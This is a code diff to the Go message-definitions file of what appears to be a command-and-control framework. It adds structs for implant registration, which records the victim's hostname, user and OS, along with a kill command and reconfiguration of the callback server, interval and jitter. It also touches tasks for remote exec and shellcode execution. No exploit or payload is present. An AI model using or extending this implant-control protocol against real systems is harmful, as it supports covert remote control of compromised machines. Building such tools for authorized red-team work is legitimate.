@@ -6,10 +6,15 @@ package communication
 // This map correlates all MessageType's to a specific data stucture for a message. This can be used for reflection so that no big switch
 // statements have to be created. Note that MessageTypes and TaskTypes are the same.
 var MessageTypeToStruct = map[int]func() interface{}{
-	0: func() interface{} { return &ImplantRegister{} },
-	1: func() interface{} { return &ImplantCheckinReq{} },
-	2: func() interface{} { return &ImplantCheckinResp{} },
+	0: func() interface{} { return &ImplantRegisterReq{} },
+	1: func() interface{} { return &ImplantRegisterResp{} },
+	2: func() interface{} { return &ImplantCheckinReq{} },
+	3: func() interface{} { return &ImplantCheckinResp{} },
 	4: func() interface{} { return &ImplantErrorResp{} },
+	5: func() interface{} { return &ImplantKillReq{} },
+	6: func() interface{} { return &ImplantKillResp{} },
+	7: func() interface{} { return &ImplantConfigReq{} },
+	8: func() interface{} { return &ImplantConfigResp{} },
 	//...
 	//reserved for implant functionality
 
@@ -32,6 +37,8 @@ var MessageTypeToStruct = map[int]func() interface{}{
 
 // Used in CLI to map taskType to readable name
 var MessageTypeToModuleName = map[int]string{
+	6:  "implant kill",
+	7:  "change config",
 	11: "file info",
 	13: "ls",
 	15: "exec",
@@ -47,13 +54,19 @@ type Task interface {
 	SetTaskId(id string) //This function is only used in the API. It's the API responsibility to generate tasks.
 }
 
-type ImplantRegister struct {
+type ImplantRegisterReq struct {
 	ImplantId   string
 	ImplantName string
 	Hostname    string
 	Username    string
 	UID         string
 	GID         string
+	Os          string
+	Arch        string
+}
+
+type ImplantRegisterResp struct {
+	Success bool
 }
 
 type ImplantCheckinReq struct {
@@ -68,6 +81,44 @@ type ImplantCheckinResp struct {
 type ImplantErrorResp struct {
 	TaskId string
 	Error  string
+}
+
+type ImplantKillReq struct {
+	TaskId string
+}
+
+func (t *ImplantKillReq) SetTaskId(id string) {
+	t.TaskId = id
+}
+
+type ImplantKillResp struct {
+	TaskId    string
+	ImplantId string
+}
+
+func (t *ImplantKillResp) SetTaskId(id string) {
+	t.TaskId = id
+}
+
+type ImplantConfigReq struct {
+	TaskId           string
+	ServerIp         string
+	ServerPort       int
+	CallbackInterval int
+	CallbackJitter   int
+}
+
+func (t *ImplantConfigReq) SetTaskId(id string) {
+	t.TaskId = id
+}
+
+type ImplantConfigResp struct {
+	TaskId  string
+	Success bool
+}
+
+func (t *ImplantConfigResp) SetTaskId(id string) {
+	t.TaskId = id
 }
 
 type FileInfoReq struct {
@@ -122,7 +173,7 @@ func (t *ExecReq) SetTaskId(id string) {
 
 type ExecResp struct {
 	TaskId string
-	Output []byte
+	Output string
 }
 
 func (t *ExecResp) SetTaskId(id string) {
@@ -187,7 +238,7 @@ func (t *UploadResp) SetTaskId(id string) {
 
 type ShellcodeExecReq struct {
 	TaskId    string
-	Shellcode string
+	Shellcode []byte
 }
 
 func (t *ShellcodeExecReq) SetTaskId(id string) {
